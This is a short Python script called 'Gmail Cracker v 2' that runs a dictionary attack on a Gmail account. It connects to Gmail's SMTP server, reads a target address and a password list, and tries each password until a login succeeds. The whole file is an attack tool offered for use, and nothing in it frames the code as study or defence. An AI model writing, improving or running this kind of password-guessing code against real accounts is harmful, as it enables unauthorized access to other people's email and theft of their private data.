import smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()


print("        +=======================================+")
print("        |........ Gmail Cracker v 2 .........|")
print("        +---------------------------------------+")
print("        |                                       |")
print("        |         By: Muhammad Zakarya          |")
print("        |                                       |")
print("        |                                       |")
print("        |                                       |")
print("        |                                       |")
print("        +=======================================+")
print("        |..........Gmail Cracker v 2.........|")
print("        +---------------------------------------+")


user = raw_input("Enter email: ")
passfile = raw_input("Enter password list: ")
passfile = open(passfile, "r")

for password in passfile :
	try :
		smtpserver.login(user, password)
		print("[+] Password Found ==> %s ") % password
		break;
		
	except smtplib.SMTPAuthenticationError:
		print("[!] Password is incorrect ===> %s ") % password
